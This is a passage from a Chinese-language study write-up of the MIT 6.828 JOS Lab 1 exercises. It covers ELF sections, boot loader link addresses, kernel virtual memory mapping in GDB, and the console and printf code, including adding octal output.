0x7fff5fbff81a    0
0x7fff5fbff81b    0
</code></pre><p>500的十六进制是0x1F4, 因为char指针加1使指针指向 0x7fff5fbff815，所以修改其值为0xF4，0x7fff5fbff816为0x1，0x7fff5fbff818为0x0，所以a[1]值变为0x1F490=128144，a[2]为0x100=256。所以输出 <code>a[0] = 200, a[1] = 128144, a[2] = 256, a[3] = 302</code>。</p>
<pre class=" language-c"><code class="language-c">b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"6: a = %p, b = %p, c = %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>b是int指针，所以a + 1即a的地址加上sizeof(int *)也就是4，所以指向a[1]。而c参考上一段的介绍，可知道是在char指针情况下进行加1，所以地址偏移1。所以输出 <code>6: a = 0x7fff5fbff810, b = 0x7fff5fbff814, c = 0x7fff5fbff811</code>。</p>
<p>接着就可以来学习内核。为了理解 <code>boot/main.c</code>， 需要了解ELF二进制文件。编译并链接比如JOS内核这样的C程序，编译器会将源文件(.c)转为包含汇编指令的目标文件(.o)。接着链接器把所有的目标文件组合成一个单独的二进制镜像（binary image），比如 <code>obj/kern/kernel</code>，这种文件就是ELF(是可执行可链接形式的缩写)。</p>
<p>当前只需要知道，可执行的ELF文件由带有加载信息的头，多个程序段表组成。每个程序段表是一个连续代码块或者数据，它们要被加载到内存具体地址中。boot loader 不修改源码和数据，直接加载到内存中并运行。</p>
<p>ELF开头是固定长度的 <em>ELF头</em>，之后是一个可变长度的程序头，它列出了需要加载的程序段。ELF头的定义在 <code>inc/elf.h</code> 中。主要学习以下3个程序段：</p>
<ul>
<li>.text: 程序执行指令</li>
<li>.rodata:只读数据，比如ASCII字符串</li>
<li>.data: 存放程序初始化的数据段，比如有初始值的全局变量。</li>
</ul>
<p>当链接器计算程序内存布局时，会在内存里紧挨着.data段的.bss段中保留空间给未初始化的全局变量。C规定未初始化的全局变量为0。因此没必要在ELF的.bss段储存内容，链接器只储存了.bss段的地址和大小。</p>
<p>使用 <code>objdump -h obj/kern/kernel</code> 可以查看ELF头的相关信息。</p>
<p><img src="5.png" alt=""></p>
<p>重点关注 .text段 的VMA(链接地址)和LMA(加载地址)，段的加载地址即加载进内存的地址。段的链接地址就是这个段预计在内存中执行的地址。链接程序有多种编码链接地址的方法。通常链接和加载的地址是一致的。查看boot loader的 .text段</p>
<pre class=" language-bash"><code class="language-bash">objdump -h obj/boot/boot.out
</code></pre>
<p><img src="6.png" alt=""></p>
<p>boot loader使用 <em>ELF程序头(Program Headers)</em> 确定如何加载段。程序头指明ELF中哪部分加载进内存和其所在的地址。使用一下命令查看</p>
<pre class=" language-bash"><code class="language-bash">objdump -x obj/kern/kernel
</code></pre>
<p><img src="7.png" alt=""></p>
<p>其中Program Headers下面列出的程序头中，开头的LOAD代表已经加载到内存中了，另外显示出了虚拟地址(vaddr)，物理地址(paddr)以及存放区域的大小(memsz和filesz)。</p>
<p>回到 <code>boot/main.c</code>， ph-&gt;p_pa是每个程序头包含的段目的物理地址。</p>
<p>BIOS把引导扇区加载到内存地址0x7c00，这也就是引导扇区的加载地址和链接地址。在 <code>boot/Makefrag</code> 中，是通过传 -Ttext 0x7C00 这个参数给链接程序设置了链接地址，因此链接程序在生成的代码中产生正确的内存地址。</p>
<h4 id="Exercise_5"><a href="#Exercise_5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><p>修改 <code>boot/Makefrag</code> 让其加载地址出错。查看这个文件</p>
<pre class=" language-bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span>OBJDIR<span class="token variable">)</span></span>/boot/boot: <span class="token variable"><span class="token variable">$(</span>BOOT_OBJS<span class="token variable">)</span></span>
    @echo + ld boot/boot
    <span class="token variable"><span class="token variable">$(</span>V<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>LD<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>LDFLAGS<span class="token variable">)</span></span> -N -e start -Ttext 0x7C00 -o <span class="token variable">$@</span>.out $^
    <span class="token variable"><span class="token variable">$(</span>V<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>OBJDUMP<span class="token variable">)</span></span> -S <span class="token variable">$@</span>.out <span class="token operator">></span><span class="token variable">$@</span>.asm
    <span class="token variable"><span class="token variable">$(</span>V<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>OBJCOPY<span class="token variable">)</span></span> -S -O binary -j .text <span class="token variable">$@</span>.out <span class="token variable">$@</span>
    <span class="token variable"><span class="token variable">$(</span>V<span class="token variable">)</span></span>perl boot/sign.pl <span class="token variable"><span class="token variable">$(</span>OBJDIR<span class="token variable">)</span></span>/boot/boot
</code></pre>
<p>可以发现 -Ttext 后面的参数就是入口地址。如果把这个值修改为0x8C00，保存后回到lab1文件夹下进行make，查看 <code>obj/boot/boot.asm</code> 会发现，开头</p>
<pre><code>Disassembly of section .text:

00008c00 &lt;start&gt;:
.set CR0_PE_ON,      0x1         # protected mode enable flag

.globl start
start:
  .code16                     # Assemble for 16-bit mode
  cli                         # Disable interrupts
    8c00:    fa                       cli    
  cld                         # String operations increment
    8c01:    fc                       cld
</code></pre><p>可以发现起始地址从原来的 00007c00 变为 00008c00。虽然此时在0x7c00处打断点然后运行时正常的，但是继续si以后会在 <code>[   0:7c2d] =&gt; 0x7c2d:    ljmp   $0x8,$0x8c32</code> 出循环，同时qemu端口出现了错误。因为不能ljmp到$0x7c32而是调到了$0x8c32，所以无法执行正确的指令。查看 <code>boot.asm</code> 可以知道上面这个指令是 <code>ljmp    $PROT_MODE_CSEG, $protcseg</code>，是为了进入32位模式的。</p>
<p>除了段信息，ELF头中的e_entry字段也很重要。这个字段保存了程序入口点(entry point)的链接地址，也就是程序执行的text字段中的内存地址。使用一下命令查看<code>objdump -f obj/kern/kernel</code></p>
<p><img src="8.png" alt=""></p>
<h4 id="Exercise_6"><a href="#Exercise_6" class="headerlink" title="Exercise 6"></a>Exercise 6</h4><p>使用GDB的 <code>x/Nx ADDR</code> 可以打印内存地址ADDR的 <em>N</em> 个字。字的大小分情况的，GDB中一个字是两个字节。</p>
<p>查看BIOS启动时0x00100000处的8歌字，然后继续到boot loader进入内核的位置，再查看，发现8个字的内容不同。</p>
<p>现在0x7c00处打断点，然后运行到断点处，使用 <code>x/8x 0x100000</code> 可以看到</p>
<p><img src="9.png" alt=""></p>
<p>根据之前的看到程序入口点是 0x10000c ，所以在 0x10000c 处打断点运行，同样可以看到</p>
<p><img src="10.png" alt=""></p>
<p>使用 <code>x/10i 0x100000</code> 会看到</p>
<p><img src="11.png" alt=""></p>
<p>应该能感觉到 0x100000 处存放的其实就是程序指令段，也就是说 bootmain 函数会把内核的程序段送到内存 0x100000 处。</p>
<h2 id="Part_3_3A_The_Kernel"><a href="#Part_3_3A_The_Kernel" class="headerlink" title="Part 3: The Kernel"></a>Part 3: The Kernel</h2><h3 id="u4F7F_u7528_u865A_u62DF_u5185_u5B58"><a href="#u4F7F_u7528_u865A_u62DF_u5185_u5B58" class="headerlink" title="使用虚拟内存"></a>使用虚拟内存</h3><p>boot loader 的链接地址和加载地址是一样的，然而 kernel 的链接地址和加载地址有些差异。查看 <code>kern/kernel.ld</code> 可以发现内核地址在 0xF0100000。</p>
<p>操作系统内核通常被链接并且运行在非常高的虚拟地址，比如文件里看到的 0xf0100000，为了让处理器虚拟地址空间的低地址部分给用户程序使用。</p>
<p>许多机器没有地址为 0xf0100000 的物理内存，所以内核不能放在那儿。因此使用处理器内存管理硬件将虚拟地址 0xf0100000 (内核希望运行的链接地址)映射到物理地址 0x00100000 (boot loader加载内核后所放的物理地址)。尽管内核虚拟地址很高，但加载进物理地址位于1MB的地方仅仅高于BIOS的ROM。这需要PC至少有1MB的物理内存。</p>
<p>在下一个lab，会映射物理地址空间底部256MB，也就是 0x00000000 到 0x0fffffff，到虚拟地址 0xf0000000 ~ 0xffffffff。所以JOS只使用物理内存开始的256MB。</p>
<p>目前，只是映射了物理内存开始的4MB， 使用手写的静态初始化页目录和也表在 <code>kern/entrypgdir.c</code>。当 <code>kern/entry.S</code> 设置 <code>CR0_PG</code> 标记，存储器引用就变为虚拟地址，即存储器引用是由虚拟存储器硬件转换为物理地址的虚拟地址。<code>entry_pgdir</code> 将虚拟地址 0xf0000000 ~ 0xf0400000 转换为物理地址 0x00000000 ~ 0x00400000，虚拟地址 0x00000000 ~ 0x00400000 也转换为物理地址 0x00000000 ~ 0x00400000。任何不在这两个范围内的虚拟地址会导致硬件异常。</p>
<h4 id="Exercise_7"><a href="#Exercise_7" class="headerlink" title="Exercise 7"></a>Exercise 7</h4><p>追踪JOS内核并停在 <code>movl %eax, %cr0</code>。查看内存 0x00100000 和 0xf0100000。接着使用 <code>stepi</code> 来看上面两个地址里内容的变化。</p>
<p>若注释了 <code>kern/entry.S</code> 的 <code>movl %eax, %cr0</code>, 查看第一个出现问题的指令是什么。</p>
<p>查看 <code>kern/entry.S</code> 发现 <code>_start</code> 是ELF入口点，exercise 5 提到了入口点是 0x0010000c. 所以在0x0010000c处打断点。</p>
<pre><code>(gdb) b *0x0010000c
</code></pre><p>接着输入 <code>c</code> 使程序运行到断点处。使用 <code>x/4i</code> 来查看后四条指令,发现 0x00100000 和 0xf0100000 不同。</p>
<p><img src="12.png" alt=""></p>
<p>在执行完6次si后，终于 0x00100000 和 0xf0100000 处内容相同。</p>
<p><img src="13.png" alt=""></p>
<p>也就是说，0xf0100000 的内容被映射到 0x00100000。</p>
<p>注释 <code>movl %eax, %cr0</code> 后，<code>make clean</code> 之后重新编译，再运行。一步步 si 后出现了问题。</p>
<p><img src="14.png" alt=""></p>
<p>在0x10002a处的jmp指令，要跳到 0xf010002c 处， 然而因为没有分页管理，不会进行虚拟地址映射到物理地址的转化，再另一个窗口可以看到错误信息，访问地址超出内存。</p>
<p><img src="15.png" alt=""> </p>
<h3 id="u683C_u5F0F_u5316_u8F93_u51FA_u5230_u63A7_u5236_u53F0"><a href="#u683C_u5F0F_u5316_u8F93_u51FA_u5230_u63A7_u5236_u53F0" class="headerlink" title="格式化输出到控制台"></a>格式化输出到控制台</h3><p>分析 <code>kern/printf.c</code>, <code>lib/printfmt.c</code>, 和 <code>kern/console.c</code> 的代码。</p>
<h4 id="Exercise_8"><a href="#Exercise_8" class="headerlink" title="Exercise 8"></a>Exercise 8</h4><p>完成指定输出”%o”格式字符串的代码。</p>
<p>首先分析 <code>kern/printf.c</code>, <code>lib/printfmt.c</code>, 和 <code>kern/console.c</code> 的关系。</p>
<p><code>kern/printf.c</code>里的 <code>vcprintf</code>, <code>cprintf</code> 都调用 <code>lib/printfmt.c</code> 的 <code>vprintfmt</code>。<code>kern/printf.c</code>里的 <code>putch</code> 调用 <code>kern/console.c</code> 的 <code>cputchar</code>。<code>lib/printfmt.c</code> 里也有 <code>putch</code>。</p>
<p>所以 <code>kern/printf.c</code> 和 <code>lib/printfmt.c</code> 依赖 <code>kern/console.c</code>。</p>
<p>首先先看看 <code>putch</code> 里调用的 <code>cputchar</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// 'High'-level console I/O.  Used by readline and cprintf.</span>

<span class="token keyword">void</span>
<span class="token function">cputchar</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">cons_putc</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// output a character to the console</span>
<span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">serial_putc</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">lpt_putc</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">cga_putc</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><code>cputchar</code>调用的是 <code>cons_putc</code>, 所以 <code>cons_putc</code> 才是关键。 <code>cons_putc</code> 的功能是输出一个字符到控制台。<code>cons_putc</code> 又是由 <code>serial_putc</code>， <code>lpt_putc</code> 和 <code>cga_putc</code> 组成。</p>
<p>因此，要先来看 <code>serial_putc</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> COM1        0x3F8</span>
<span class="token macro property">#<span class="token directive keyword">define</span> COM_LSR        5    </span><span class="token comment" spellcheck="true">// In:    Line Status Register</span>
<span class="token macro property">#<span class="token directive keyword">define</span>   COM_LSR_TXRDY    0x20    </span><span class="token comment" spellcheck="true">//   Transmit buffer avail</span>
<span class="token macro property">#<span class="token directive keyword">define</span> COM_TX        0    </span><span class="token comment" spellcheck="true">// Out: Transmit buffer (DLAB=0)</span>

<span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">serial_putc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
         <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">inb</span><span class="token punctuation">(</span>COM1 <span class="token operator">+</span> COM_LSR<span class="token punctuation">)</span> <span class="token operator">&amp;</span> COM_LSR_TXRDY<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> <span class="token number">12800</span><span class="token punctuation">;</span>
         i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">outb</span><span class="token punctuation">(</span>COM1 <span class="token operator">+</span> COM_TX<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>它控制的是端口0x3F8，inb 读取的是 COM1 + COM_LSR = 0x3FD 端口，outb 输出到了 COM1 + COM_TX = 0x3F8。</p>
<p>详细端口信息查看这个<a href="http://bochs.sourceforge.net/techspec/PORTS.LST" target="_blank" rel="external">PORTS.LST</a>。</p>
<p>在 inb(COM1 + COM_LSR) 之后， 有 &amp; COM_LSR_TXRDY 这个操作。 <code>!(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY)</code> 其实是为了查看读入的数据的第6位，也就是 PORTS.LST 中 03FD 中提到的 bit 5 是否为1。 如果为1，上面的语句结果就是0，停止for循环。这个 bit 5 是判断发送数据缓冲寄存器是否为空。</p>
<p>outb 是将端口 0x3F8 的内容输出到 c。当 0x3F8 被写入数据，它作为发送数据缓冲寄存器，数据是要发给串口。</p>
<p>所以serial_putc是为了把一个字符输出到串口。</p>
<p>再来看 <code>lpt_putc</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/***** Parallel port output code *****/</span>
<span class="token comment" spellcheck="true">// For information on PC parallel port programming, see the class References</span>
<span class="token comment" spellcheck="true">// page.</span>

<span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">lpt_putc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">inb</span><span class="token punctuation">(</span><span class="token number">0x378</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> <span class="token number">12800</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x378</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x378</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token operator">|</span><span class="token number">0x04</span><span class="token operator">|</span><span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x378</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>将字符给并口设备。</p>
<p>最后一个是 <code>cga_putc</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">cga_putc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// if no attribute given, then use black on white</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        c <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0x0700</span><span class="token punctuation">;</span>

    <span class="token keyword">switch</span> <span class="token punctuation">(</span>c <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">'\b'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>crt_pos <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            crt_pos<span class="token operator">--</span><span class="token punctuation">;</span>
            crt_buf<span class="token punctuation">[</span>crt_pos<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token string">' '</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'\n'</span><span class="token punctuation">:</span>
        crt_pos <span class="token operator">+</span><span class="token operator">=</span> CRT_COLS<span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">/* fallthru */</span>
    <span class="token keyword">case</span> <span class="token string">'\r'</span><span class="token punctuation">:</span>
        crt_pos <span class="token operator">-</span><span class="token operator">=</span> <span class="token punctuation">(</span>crt_pos <span class="token operator">%</span> CRT_COLS<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'\t'</span><span class="token punctuation">:</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cons_putc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
        crt_buf<span class="token punctuation">[</span>crt_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* write the character */</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// What is the purpose of this?</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>crt_pos <span class="token operator">>=</span> CRT_SIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> i<span class="token punctuation">;</span>

        <span class="token function">memmove</span><span class="token punctuation">(</span>crt_buf<span class="token punctuation">,</span> crt_buf <span class="token operator">+</span> CRT_COLS<span class="token punctuation">,</span> <span class="token punctuation">(</span>CRT_SIZE <span class="token operator">-</span> CRT_COLS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint16_t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> CRT_SIZE <span class="token operator">-</span> CRT_COLS<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> CRT_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
            crt_buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x0700</span> <span class="token operator">|</span> <span class="token string">' '</span><span class="token punctuation">;</span>
        crt_pos <span class="token operator">-</span><span class="token operator">=</span> CRT_COLS<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/* move that little blinky thing */</span>
    <span class="token function">outb</span><span class="token punctuation">(</span>addr_6845<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span>addr_6845 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> crt_pos <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span>addr_6845<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span>addr_6845 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> crt_pos<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>首先 <code>!(c &amp; ~0xFF)</code> 是否在 0 ~ 255 之前。<code>\b</code>很容易理解，就是退格键，让缓冲区 <code>crt_buf</code> 的下标 <code>crt_pos</code> 减1。其他的同理，case都是格式操作。default就是往缓冲区里写入字符c。之后就是当缓存超过CRT_SIZE，就是用 <code>memmove</code> 复制内存内容。</p>
<p>最后四句代码是将缓冲区的内容输出到显示屏。</p>
<h3 id="u5185_u8054_u6C47_u7F16tips"><a href="#u5185_u8054_u6C47_u7F16tips" class="headerlink" title="内联汇编tips"></a>内联汇编tips</h3><p>这里提一下内联汇编。 <code>inb</code> 和 <code>outb</code> 都是内联汇编。其中 <code>inb</code> 函数</p>
<pre class=" language-c"><code class="language-c"><span class="token function">inb</span><span class="token punctuation">(</span><span class="token keyword">int</span> port<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    uint8_t data<span class="token punctuation">;</span>
    __asm <span class="token function">__volatile</span><span class="token punctuation">(</span><span class="token string">"inb %w1,%0"</span> <span class="token punctuation">:</span> <span class="token string">"=a"</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">"d"</span> <span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p> “__asm__“表示后面的代码为内联汇编， “__volatile__“表示编译器不要优化代码。括号里是汇编指令。</p>
<p>内联汇编的模板是：__asm__(汇编语句模板: 输出部分: 输入部分: 破坏描述部分)。 共四个部分：汇编语句模板，输出部分，输入部分，破坏描述部分，各部分使用”:”格开，汇编语句模板必不可少， 其他三部分可选，如果使用了后面的部分，而前面部分为空，也需要用”:”格开，相应部分内容为空。如上面程序则只是用了前三部分。</p>
<p>“inb %w1,%0”表示汇编语句模板， “=a” (data)是输出部分，”d” (port)是输入部分。本例中只有两个：“data” 和“port”，他们按照出现的顺序分别与指令操作数 “%0”,“%1”对应。每个输出操作数的限定字符串必须包含“=”表示他是一个输出操作数。例如”=a” (data)就是一个输出操作数，其限定字符串为”=a”，(data)就是C语言变量。</p>
<p>之后来看 <code>lib/printfmt.c</code> 的代码。首先来看 <code>kern/printf.c</code> 里提到的 <code>vprintfmt</code>函数。</p>
<p>代码太长了，简单点先说一下它的四个输入参数。</p>
<ul>
<li>void (*putch)(int, void*) 函数指针，一般调用输出到屏幕上的函数</li>
<li>void *putdat 输入字符要放的内存地址指针</li>
<li>const char *fmt 格式化字符串</li>
<li>va_list ap 多个输入参数</li>
</ul>
<p>在vprintf里传入的参数putdat是cnt的地址，cnt是用来做计数器的。cprintf功能类似。</p>
<p>分析完三个文件，回到题目，要去实现%o的格式化输出。在 <code>lib/printfmt.c</code> 可以看到要填写的地方。参考上面 <code>case &#39;u&#39;</code> 的写法。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">case</span> <span class="token string">'o'</span><span class="token punctuation">:</span>
    num <span class="token operator">=</span> <span class="token function">getuint</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ap<span class="token punctuation">,</span> lflag<span class="token punctuation">)</span><span class="token punctuation">;</span>
    base <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">goto</span> number<span class="token punctuation">;</span>
</code></pre>
<p>修改完以后保存，<code>make clean</code> 之后运行，会发现启动以后，qemu里JOS启动时会出现这样一行字。</p>
<p><img src="16.png" alt=""></p>
<p>第一行完成了6828转八进制。</p>
<p>解释 <code>console.c</code> 中的这段代码</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>crt_pos <span class="token operator">>=</span> CRT_SIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>

    <span class="token function">memmove</span><span class="token punctuation">(</span>crt_buf<span class="token punctuation">,</span> crt_buf <span class="token operator">+</span> CRT_COLS<span class="token punctuation">,</span> <span class="token punctuation">(</span>CRT_SIZE <span class="token operator">-</span> CRT_COLS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint16_t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> CRT_SIZE <span class="token operator">-</span> CRT_COLS<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> CRT_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        crt_buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x0700</span> <span class="token operator">|</span> <span class="token string">' '</span><span class="token punctuation">;</span>
    crt_pos <span class="token operator">-</span><span class="token operator">=</span> CRT_COLS<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>简单点说就是当字符长度超过CRT_SIZE， 证明屏幕放不下了，需要页面向上滚动一行。</p>
<p>观察下面的代码，分析fmt和ap指向什么。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> z <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
<span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"x %d, y %x, z %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>fmt 指向的是格式字符串 “x %d, y %x, z %d\n”，ap 指向的是参数 x, y, z。<br>将这段代码加入到 <code>kern\monitor.c</code> 并重新编译运行，即可显示结果。</p>
<p>运行这段代码。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0x00646c72</span><span class="token punctuation">;</span>
<span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"H%x Wo%s"</span><span class="token punctuation">,</span> <span class="token number">57616</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
